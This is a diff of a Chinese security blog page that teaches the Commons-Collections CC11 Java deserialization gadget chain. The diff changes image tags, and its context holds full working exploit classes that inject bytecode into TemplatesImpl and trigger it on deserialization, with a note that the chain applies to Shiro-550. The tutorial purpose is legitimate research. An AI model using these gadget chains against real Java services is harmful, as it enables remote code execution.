@@ -292,7 +292,7 @@
 
                 <p>CC11链</p>
 <span id="more"></span>
-<h1 id="Java-反序列化-Commons-Collections-篇-09-CC11-链"><a href="#Java-反序列化-Commons-Collections-篇-09-CC11-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 09-CC11 链"></a>Java 反序列化 Commons-Collections 篇 09-CC11 链</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>原本 CC 链子从 1-7 学完就可以了，最近<a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536" >木爷的博客<i class="fas fa-external-link-alt"></i></a>修好了，木爷在 Shiro-550 的文章里面提及了这一条链子，就顺便自己也学一学。</p>
+<h1 id="Java-反序列化-Commons-Collections-篇-09-CC11-链"><a href="#Java-反序列化-Commons-Collections-篇-09-CC11-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 09-CC11 链"></a>Java 反序列化 Commons-Collections 篇 09-CC11 链</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>原本 CC 链子从 1-7 学完就可以了，最近<a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">木爷的博客<i class="fas fa-external-link-alt"></i></a>修好了，木爷在 Shiro-550 的文章里面提及了这一条链子，就顺便自己也学一学。</p>
 <ul>
 <li>同样，就看 yso 的链子，看一看自己可不可以完全成功地写出 EXP 来。</li>
 </ul>
@@ -303,12 +303,12 @@
 <p>一些细致的环境搭建可以参考我 CC 链的第一篇文章。</p>
 <p><a href="https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链</a></p>
 <h2 id="0x03-CC11-链分析"><a href="#0x03-CC11-链分析" class="headerlink" title="0x03 CC11 链分析"></a>0x03 CC11 链分析</h2><h3 id="写在分析前的一些话"><a href="#写在分析前的一些话" class="headerlink" title="写在分析前的一些话"></a>写在分析前的一些话</h3><p>木头师傅说是 CC2 + CC6 的结合体，也有 qax 的一篇文章说除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N，这里我也把 CC2 与 CC6 的流程图放上来。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ALLCC.png" class>
 <h3 id="TemplatesImpl-解析与利用"><a href="#TemplatesImpl-解析与利用" class="headerlink" title="TemplatesImpl 解析与利用"></a>TemplatesImpl 解析与利用</h3><ul>
 <li>在之前的 <strong><a href="https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#toc-heading-25">Java反序列化基础篇-05-类的动态加载</a></strong> 文章当中，我们讲到了一种利用 <strong>利用 ClassLoader#defineClass 直接加载字节码</strong>的手段。</li>
 </ul>
 <p>在这一条小链子当中，流程图可以绘制如下。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ClassLoaderDefineClass.png" class>
 
 <p>这里我们可以正向看，首先是 <code>loadClass()</code>，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass()</code>。</p>
 <p>对于 <code>findClass()</code> 方法</p>
@@ -328,19 +328,19 @@
 </blockquote>
 <p>现在我们的 <code>defineClass()</code> 方法的作用域为 <code>protected</code>，我们需要找到作用域为 <code>public</code> 的类，方便我们利用。照样 find usages</p>
 <p>在 <code>TemplatesImpl</code> 类的 <code>static class TransletClassLoader</code> 中找到了我们能够运用的类。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/defaultDefineClass.png" class>
 
 <p>这里的 <code>defineClass()</code> 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/defineTransletClasses.png" class>
 
 <p>因为作用域是 private，所以我们看一看谁调用了 <code>defineTransletClasses()</code> 方法</p>
 <ul>
 <li>这里还有一点需要注意的，<code>_bytecodes</code> 的值不能为 null，否则会抛出异常。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/getTransletInstance.png" class>
 
 <p>还是同一个类下的 <code>getTransletInstance()</code> 方法调用了 <code>defineTransletClasses()</code> 方法，并且这里有一个 <code>newInstance()</code> 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/synchronized.png" class>
 
 <ul>
 <li>找到了一个 public 的方法，接下来我们开始利用。</li>
@@ -351,7 +351,7 @@
 <ul>
 <li>如果没有一堆限制条件，我们现在的这两行代码就可以进行命令执行了。这里的限制条件指的是类似于下图的这一些。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ValueSee.png" class>
 
 <p>如果此处的 <code>_name</code> 为 null，则后续的代码都不执行，也到不了我们调用 <code>newInstance()</code> 实例化的地方。</p>
 <p>并且这里我们需要让 <code>_classs</code> 的值为空，才能进入调用 <code>newInstance()</code></p>
@@ -359,10 +359,10 @@
 <h4 id="2-分析限制条件并编写-EXP"><a href="#2-分析限制条件并编写-EXP" class="headerlink" title="2. 分析限制条件并编写 EXP"></a>2. 分析限制条件并编写 EXP</h4><ul>
 <li>这里的 TemplatesImpl 是可以进行序列化的，所以这里我们使用反射修改其值。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/TemplatesImplSerial.png" class>
 
 <p>先列举一些需要我们进行赋值的属性值，用反射修改属性值。赋值这里需要”对症下药”，也就是需要什么类型的值，我们就给什么类型。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ValueSet.png" class>
 
 <p><code>_class</code> 的值应当为 null，我们去看 <code>TemplatesImpl</code> 的构造方法中没有给 <code>_class</code> 赋初值，所以不用管它。</p>
 <p><code>_name</code> 的值，这里需要的是 String，所以我们简单赋个 String 即可。</p>
@@ -384,7 +384,7 @@
 
 <p>直接修改是不行的，但是我们这里的利用要求比较低，只要让 <code>_tfactory</code> 不为 null 即可，我们去看一看 <code>_tfactory</code> 的其他定义如何。</p>
 <p>在 <code>readObject()</code> 方法中，找到了 <code>_tfactory</code> 的初始化定义。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/tfactoryNotNull.png" class>
 
 <p>所以这里直接在反射中将其赋值为 <code>TransformerFactortImpl</code> 即可，伪代码如下。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
@@ -397,11 +397,11 @@
 <h4 id="解决报错，挖-0day-的必经之路！"><a href="#解决报错，挖-0day-的必经之路！" class="headerlink" title="解决报错，挖 0day 的必经之路！"></a>解决报错，挖 0day 的必经之路！</h4><ul>
 <li>按照道理来说，上面的 EXP 已经挺完美的了，但是在运行的时候我不但没有弹出计算器，反而还报错了。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/Error.png" class>
 
 <p>这里报错是由于空指针报错，我们去 <code>TemplatesImpl</code> 下打断点调试一下。</p>
 <p>我是在 393 行 <code>if (_bytecodes == null)</code> 那里打断点的。调试之后发现问题出在这儿。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/Debug.png" class>
 
 <ul>
 <li>418 行，判断在 <code>defineClass()</code> 方法中传进去的参数 b 数组的字节码是否继承了 <code>ABSTRACT_TRANSLET</code> 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 <code>ABSTRACT_TRANSLET</code> 这个父类。</li>
@@ -410,20 +410,20 @@
 <blockquote>
 <p>修改完毕之后，我们的弹计算器就成功了。</p>
 </blockquote>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/SuccessTemplatesImpl.png" class>
 
 
 <h3 id="前半段-CC6-链解析"><a href="#前半段-CC6-链解析" class="headerlink" title="前半段 CC6 链解析"></a>前半段 CC6 链解析</h3><p>后半段链子和 CC6 的链子是一样的，但我们还是来分析一遍。<br>尾部这里是 InvokerTransformer.transform()，所以我们从这里开始找起。</p>
 <ul>
 <li>去到 InvokerTransformer 下的 <code>transform()</code> 方法，发现确实存在命令执行的特性，我们去找一找谁调用了 <code>transform()</code> 方法。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/InvokerTransformer.png" class>
 
 <p>发现是 LazyMap.get() 调用了 <code>transform()</code> 方法，参数是 factory，这个 factory 的变量我们到时候可以通过反射修改。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/LazyMap.png" class>
 
 <p>然后去找谁调用了 <code>get()</code> 方法，这里应该挺难找的，就直接跟着赛博鼠师傅的链子走，是 <code>TiedMapEntry.getValue()</code> 调用了 <code>get()</code> 方法</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/TiedMapEntrygetValue.png" class>
 
 <p>接着，在同个类里面找到了 <code>hashCode()</code> 方法调用了 <code>getValue()</code> 方法。这里 <code>hashCode()</code> 和 <code>toString()</code> 应该都是可以的，因为都是广泛的函数，最后跟着链子走，具体就不分析了。具体详见<a href="https://drun1baby.github.io/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">Java反序列化Commons-Collections篇03-CC6链</a></p>
 <p>这其实就是 CC6 的链子，我看其他师傅的文章，因为 CC2 + CC6 组成的链子能够在 Transformer[] 被禁用的时候很好的进行代码执行。</p>
@@ -446,7 +446,7 @@
 <h3 id="2-找链子"><a href="#2-找链子" class="headerlink" title="2. 找链子"></a>2. 找链子</h3><ul>
 <li>根据 ysoSerial 官方的链子，是 <code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法调用了 <code>LazyMap</code> 的 <code>get()</code> 方法。</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/TiedMapEntryChains.png" class>
 
 <p>这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP 是不嫌多的，多写一写能让自己更加熟练。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line"> nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> nameField.set(templates,<span class="string">&quot;Drunkbaby&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line"> bytecodesField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));  </span><br><span class="line"> <span class="type">byte</span>[][] codes = &#123;evil&#125;;  </span><br><span class="line"> bytecodesField.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line"> tfactoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line"> <span class="comment">//    templates.newTransformer();  </span></span><br><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line"> <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line"> lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> lazyGetMethod.invoke(lazyMap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -459,19 +459,19 @@
 <ul>
 <li>成功弹出计算器</li>
 </ul>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/TiedMapEntryEXP.png" class>
 
 <blockquote>
 <p>这里的逻辑还是很简单的，直接 new 一个 <code>TiedMapEntry</code> 对象，并调用它的 <code>getValue()</code> 方法即可，它的 <code>getValue</code> 方法会去调用 <code>map.get(key)</code> 方法。</p>
 </blockquote>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/getValue.png" class>
 
 <p>现在我们确保了 <code>TiedMapEntry</code> 这一段链子的可用性，往上去找谁调用了 <code>TiedMapEntry</code> 中的 <code>getValue()</code> 方法。</p>
 <ul>
 <li>寻找的方法也略提一嘴，因为 <code>getValue()</code> 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。</li>
 </ul>
 <p>寻找到同名函数下的 <code>hashCode()</code> 方法调用了 <code>getValue()</code> 方法。</p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/hashCode.png" class>
 
 <p>如果我们在实战里面，在链子中找到了 <code>hashCode()</code> 方法，说明我们的构造已经可以<strong>“半场开香槟”</strong>了，</p>
 <h3 id="3-与入口类结合的整条链子"><a href="#3-与入口类结合的整条链子" class="headerlink" title="3. 与入口类结合的整条链子"></a>3. 与入口类结合的整条链子</h3><ul>
@@ -499,11 +499,11 @@
 <h3 id="4-解决在序列化的时候就弹出计算器的问题"><a href="#4-解决在序列化的时候就弹出计算器的问题" class="headerlink" title="4. 解决在序列化的时候就弹出计算器的问题"></a>4. 解决在序列化的时候就弹出计算器的问题</h3><ul>
 <li>参考 URLDNS 链中的思想，先在执行 <code>put()</code> 方法的时候，先不让其进行命令执行，在反序列化的时候再命令执行。</li>
 </ul>
-<p><font color=red>此处强烈建议师傅们去打断点好好理解一下！</font></p>
+<p><font color="red">此处强烈建议师傅们去打断点好好理解一下！</font></p>
 <p>我在打完断点后分析出来的原因是这样的：</p>
 <p>与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 <code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>，可以达到我们需要的效果。</p>
 <p>我们之前传进去的参数是 <code>chainedTransformer</code>，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 <code>chainedTransformer</code>。相关的属性值在 LazyMap 当中为 <code>factory</code></p>
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ReflectChangeFactory.png" class>
 
 <ul>
 <li>修改如下</li>
@@ -513,7 +513,7 @@
 <p>最终成功的 EXP 如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11FinalEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line"> nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> nameField.set(templates,<span class="string">&quot;Drunkbaby&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line"> bytecodesField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));  </span><br><span class="line"> <span class="type">byte</span>[][] codes = &#123;evil&#125;;  </span><br><span class="line"> bytecodesField.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line"> tfactoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line"> <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  </span></span><br><span class="line"> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器  </span></span><br><span class="line"> <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line"> lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 在 put 之后通过反射修改值  </span></span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line"> factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> factoryField.set(lazyMap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"> serialize(expMap);  </span><br><span class="line"> unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"> oos.writeObject(obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/FinalCC11EXP.png" class>
 
 <h3 id="5-最终不带-Transformer-数组的-CC11-链子"><a href="#5-最终不带-Transformer-数组的-CC11-链子" class="headerlink" title="5. 最终不带 Transformer 数组的 CC11 链子"></a>5. 最终不带 Transformer 数组的 CC11 链子</h3><p>前面我们说的链子，还是调用了 <code>Transformer</code> 数组的，但是真正的 CC11 链子是可以不带<code>Transformer</code> 数组的，这样，我们可以通过 CC11 来打 Shiro-550 的漏洞。</p>
 <blockquote>
@@ -532,7 +532,7 @@
 
